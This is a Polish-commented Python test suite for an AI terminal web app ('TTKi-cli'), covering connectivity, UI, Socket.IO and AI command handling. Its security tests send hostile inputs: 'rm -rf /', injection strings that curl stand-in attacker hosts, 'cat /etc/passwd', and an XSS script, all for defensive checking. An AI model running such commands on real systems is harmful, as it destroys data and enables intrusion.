#!/usr/bin/env python3
"""
Kompleksowy zestaw testów dla aplikacji terminala AI w stylu Bolt.
Testuje różne scenariusze użycia i funkcjonalności.
"""

import unittest
import requests
import time
import subprocess
import os
import json
import socket
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import socketio

class TestAITerminalApp(unittest.TestCase):
    """Główna klasa testów dla aplikacji AI Terminal"""
    
    @classmethod
    def setUpClass(cls):
        """Przygotowanie środowiska testowego"""
        cls.base_url = "http://localhost:4001"
        cls.vnc_url = "http://localhost:4051"
        cls.test_dir = Path(__file__).parent
        cls.setup_browser()
        
    @classmethod
    def setup_browser(cls):
        """Konfiguracja przeglądarki do testów"""
        chrome_options = Options()
        chrome_options.add_argument("--headless")  # Tryb bez okna
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.binary_location = "/var/lib/snapd/snap/bin/chromium"
        try:
            import chromedriver_autoinstaller
            chromedriver_autoinstaller.install()
            cls.driver = webdriver.Chrome(options=chrome_options)
            cls.driver.implicitly_wait(10)
        except Exception as e:
            print(f"Uwaga: Nie można uruchomić Chrome WebDriver: {e}")
            cls.driver = None
    
    @classmethod
    def tearDownClass(cls):
        """Zamknięcie przeglądarki po testach"""
        if cls.driver:
            cls.driver.quit()

class TestBasicConnectivity(TestAITerminalApp):
    """Testy podstawowej łączności i dostępności serwisów"""
    
    def test_flask_server_running(self):
        """Test: Serwer Flask działa i odpowiada"""
        try:
            response = requests.get(self.base_url, timeout=5)
            self.assertEqual(response.status_code, 200)
            self.assertIn("TTKi-cli", response.text)
        except requests.exceptions.RequestException as e:
            self.fail(f"Serwer Flask nie odpowiada: {e}")
    
    def test_vnc_server_running(self):
        """Test: Serwer noVNC działa i odpowiada"""
        try:
            response = requests.get(f"{self.vnc_url}/vnc.html", timeout=5)
            self.assertEqual(response.status_code, 200)
            self.assertIn("noVNC", response.text)
        except requests.exceptions.RequestException as e:
            self.fail(f"Serwer noVNC nie odpowiada: {e}")
    
    def test_websocket_port_open(self):
        """Test: Port WebSocket dla Socket.IO jest otwarty"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('localhost', 5000))
        sock.close()
        self.assertEqual(result, 0, "Port 5000 (Flask/Socket.IO) nie jest dostępny")
    
    def test_vnc_websocket_port_open(self):
        """Test: Port WebSocket dla noVNC jest otwarty"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('localhost', 6080))
        sock.close()
        self.assertEqual(result, 0, "Port 6080 (noVNC WebSocket) nie jest dostępny")

class TestUIFunctionality(TestAITerminalApp):
    """Testy funkcjonalności interfejsu użytkownika"""
    
    def setUp(self):
        """Przygotowanie przed każdym testem UI"""
        if not self.driver:
            self.skipTest("WebDriver niedostępny")
        self.driver.get(self.base_url)
        
    def test_page_loads_completely(self):
        """Test: Strona ładuje się kompletnie"""
        if not self.driver:
            self.skipTest("WebDriver niedostępny")
            
        # Sprawdź tytuł
        self.assertIn("TTKi-cli", self.driver.title)
        
        # Sprawdź obecność głównych elementów
        chat_input = self.driver.find_element(By.ID, "chat-input")
        self.assertTrue(chat_input.is_displayed())
        
        send_btn = self.driver.find_element(By.ID, "send-btn")
        self.assertTrue(send_btn.is_displayed())
        
        chat_messages = self.driver.find_element(By.ID, "chat-messages")
        self.assertTrue(chat_messages.is_displayed())
    
    def test_iframe_vnc_loads(self):
        """Test: iframe z noVNC ładuje się prawidłowo"""
        if not self.driver:
            self.skipTest("WebDriver niedostępny")
            
        iframe = WebDriverWait(self.driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "iframe"))
        )
        self.assertTrue(iframe.is_displayed())
        
        # Sprawdź atrybuty iframe
        self.assertEqual(iframe.get_attribute("src"), f"{self.vnc_url}/vnc.html")
        allow_attr = iframe.get_attribute("allow")
        if allow_attr:
            self.assertIn("fullscreen", allow_attr)
        self.assertIsNotNone(iframe.get_attribute("allowfullscreen"))
    
    def test_permissions_policy_headers(self):
        """Test: Nagłówki polityki uprawnień są ustawione"""
        response = requests.get(self.base_url)
        headers = response.headers
        
        self.assertIn("Permissions-Policy", headers)
        self.assertIn("fullscreen=*", headers["Permissions-Policy"])
        self.assertIn("clipboard-read=*", headers["Permissions-Policy"])
        self.assertIn("clipboard-write=*", headers["Permissions-Policy"])

class TestSocketIOCommunication(TestAITerminalApp):
    """Testy komunikacji Socket.IO"""
    
    def setUp(self):
        """Przygotowanie klienta Socket.IO"""
        self.sio = socketio.SimpleClient()
        
    def tearDown(self):
        """Zamknięcie połączenia Socket.IO"""
        if self.sio.connected:
            self.sio.disconnect()
    
    def test_socketio_connection(self):
        """Test: Połączenie Socket.IO działa"""
        try:
            self.sio.connect(self.base_url)
            self.assertTrue(self.sio.connected)
        except Exception as e:
            self.fail(f"Nie można połączyć z Socket.IO: {e}")
    
    def test_message_sending(self):
        """Test: Wysyłanie wiadomości przez Socket.IO"""
        self.sio.connect(self.base_url)
        
        # Wysłij testową wiadomość
        test_message = "echo 'Test message'"
        self.sio.emit("message", test_message)
        
        # Czekaj na odpowiedź (maksymalnie 10 sekund)
        response = self.sio.receive(timeout=10)
        self.assertIsNotNone(response)

class TestAIModelIntegration(TestAITerminalApp):
    """Testy integracji z modelem AI"""
    
    def setUp(self):
        """Przygotowanie klienta do testów AI"""
        self.sio = socketio.SimpleClient()
        self.sio.connect(self.base_url)
    
    def tearDown(self):
        """Zamknięcie połączenia"""
        if self.sio.connected:
            self.sio.disconnect()
    
    def test_simple_command_execution(self):
        """Test: Wykonanie prostego polecenia przez AI"""
        test_commands = [
            "ls -la",
            "pwd",
            "echo 'Hello World'",
            "date"
        ]
        
        for cmd in test_commands:
            with self.subTest(command=cmd):
                self.sio.emit("message", cmd)
                response = self.sio.receive(timeout=15)
                self.assertIsNotNone(response, f"Brak odpowiedzi dla polecenia: {cmd}")
    
    def test_file_operations(self):
        """Test: Operacje na plikach przez AI"""
        commands = [
            "touch test_file.txt",
            "echo 'test content' > test_file.txt",
            "cat test_file.txt",
            "rm test_file.txt"
        ]
        
        for cmd in commands:
            with self.subTest(command=cmd):
                self.sio.emit("message", cmd)
                response = self.sio.receive(timeout=10)
                self.assertIsNotNone(response)
    
    def test_programming_task(self):
        """Test: Zadanie programistyczne przez AI"""
        programming_request = "Napisz prosty skrypt Python, który wypisuje liczby od 1 do 10"
        
        self.sio.emit("message", programming_request)
        response = self.sio.receive(timeout=20)
        
        self.assertIsNotNone(response)
        # Sprawdź czy odpowiedź zawiera kod Python
        response_text = str(response)
        self.assertTrue(
            "python" in response_text.lower() or 
            "for" in response_text.lower() or
            "range" in response_text.lower()
        )

class TestErrorHandling(TestAITerminalApp):
    """Testy obsługi błędów"""
    
    def test_invalid_commands(self):
        """Test: Obsługa nieprawidłowych poleceń"""
        sio = socketio.SimpleClient()
        sio.connect(self.base_url)
        
        invalid_commands = [
            "nonexistent_command_xyz",
            "sudo rm -rf /",  # Niebezpieczne polecenie
            "",  # Puste polecenie
            "a" * 10000  # Bardzo długie polecenie
        ]
        
        for cmd in invalid_commands:
            with self.subTest(command=cmd):
                sio.emit("message", cmd)
                response = sio.receive(timeout=10)
                # Aplikacja powinna odpowiedzieć, ale obsłużyć błąd gracefully
                self.assertIsNotNone(response)
        
        sio.disconnect()
    
    def test_network_interruption_handling(self):
        """Test: Obsługa przerwania połączenia"""
        sio = socketio.SimpleClient()
        sio.connect(self.base_url)
        
        # Wyślij polecenie
        sio.emit("message", "sleep 5")
        
        # Symuluj przerwanie połączenia
        sio.disconnect()
        
        # Próbuj ponownie połączyć
        time.sleep(2)
        sio.connect(self.base_url)
        sio.emit("message", "echo 'reconnected'")
        
        response = sio.receive(timeout=10)
        self.assertIsNotNone(response)
        
        sio.disconnect()

class TestPerformance(TestAITerminalApp):
    """Testy wydajności"""
    
    def test_response_time(self):
        """Test: Czas odpowiedzi AI"""
        sio = socketio.SimpleClient()
        sio.connect(self.base_url)
        
        start_time = time.time()
        sio.emit("message", "echo 'performance test'")
        response = sio.receive(timeout=30)
        end_time = time.time()
        
        response_time = end_time - start_time
        
        self.assertIsNotNone(response)
        self.assertLess(response_time, 30.0, "Czas odpowiedzi przekracza 30 sekund")
        
        sio.disconnect()
    
    def test_concurrent_connections(self):
        """Test: Obsługa wielu równoczesnych połączeń"""
        clients = []
        
        try:
            # Utwórz 5 równoczesnych połączeń
            for i in range(5):
                client = socketio.SimpleClient()
                client.connect(self.base_url)
                clients.append(client)
            
            # Wyślij wiadomości z każdego klienta
            for i, client in enumerate(clients):
                client.emit("message", f"echo 'Client {i}'")
            
            # Sprawdź odpowiedzi
            for i, client in enumerate(clients):
                response = client.receive(timeout=15)
                self.assertIsNotNone(response, f"Brak odpowiedzi dla klienta {i}")
                
        finally:
            # Zamknij wszystkie połączenia
            for client in clients:
                if client.connected:
                    client.disconnect()

class TestSecurityAndSandbox(TestAITerminalApp):
    """Testy bezpieczeństwa i izolacji sandbox"""
    
    def test_sandbox_isolation(self):
        """Test: Izolacja środowiska sandbox"""
        sio = socketio.SimpleClient()
        sio.connect(self.base_url)
        
        # Próby dostępu do systemu hosta (powinny być ograniczone)
        restricted_commands = [
            "cat /etc/passwd",
            "ps aux | grep -v grep",
            "netstat -tlnp",
            "mount"
        ]
        
        for cmd in restricted_commands:
            with self.subTest(command=cmd):
                sio.emit("message", cmd)
                response = sio.receive(timeout=10)
                self.assertIsNotNone(response)
                # Sprawdź czy są ograniczenia lub informacje o bezpieczeństwie
        
        sio.disconnect()
    
    def test_malicious_input_filtering(self):
        """Test: Filtrowanie złośliwych wejść"""
        sio = socketio.SimpleClient()
        sio.connect(self.base_url)
        
        malicious_inputs = [
            "; rm -rf /",
            "$(curl malicious-site.com)",
            "`whoami`",
            "&&curl attacker.com",
            "<script>alert('xss')</script>"
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                sio.emit("message", malicious_input)
                response = sio.receive(timeout=10)
                self.assertIsNotNone(response)
        
        sio.disconnect()

def run_test_suite():
    """Uruchom pełny zestaw testów"""
    print("🚀 Przygotowywanie środowiska testowego...")
    
    # Sprawdź czy serwery działają
    print("📡 Sprawdzanie dostępności serwisów...")
    
    # Utwórz suite testów
    test_suite = unittest.TestSuite()
    
    # Dodaj wszystkie klasy testów
    test_classes = [
        TestBasicConnectivity,
        TestUIFunctionality,
        TestSocketIOCommunication,
        TestAIModelIntegration,
        TestErrorHandling,
        TestPerformance,
        TestSecurityAndSandbox
    ]
    
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        test_suite.addTests(tests)
    
    # Uruchom testy
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    # Podsumowanie
    print("\n" + "="*60)
    print("📊 PODSUMOWANIE TESTÓW")
    print("="*60)
    print(f"Uruchomiono testów: {result.testsRun}")
    print(f"Błędy: {len(result.errors)}")
    print(f"Niepowodzenia: {len(result.failures)}")
    print(f"Pominięte: {len(result.skipped) if hasattr(result, 'skipped') else 0}")
    
    if result.errors:
        print("\n❌ BŁĘDY:")
        for test, error in result.errors:
            print(f"  - {test}: {error}")
    
    if result.failures:
        print("\n❌ NIEPOWODZENIA:")
        for test, failure in result.failures:
            print(f"  - {test}: {failure}")
    
    success_rate = ((result.testsRun - len(result.errors) - len(result.failures)) / result.testsRun) * 100
    print(f"\n✅ Wskaźnik sukcesu: {success_rate:.1f}%")
    
    return result.wasSuccessful()

if __name__ == "__main__":
    print("⚠️  TESTY PRZYGOTOWANE - OCZEKIWANIE NA POLECENIE URUCHOMIENIA")
    print("   Aby uruchomić testy, wywołaj: run_test_suite()")
    print("   Lub użyj: python test_scenarios.py --run")
    
    import sys
    if "--run" in sys.argv:
        run_test_suite()
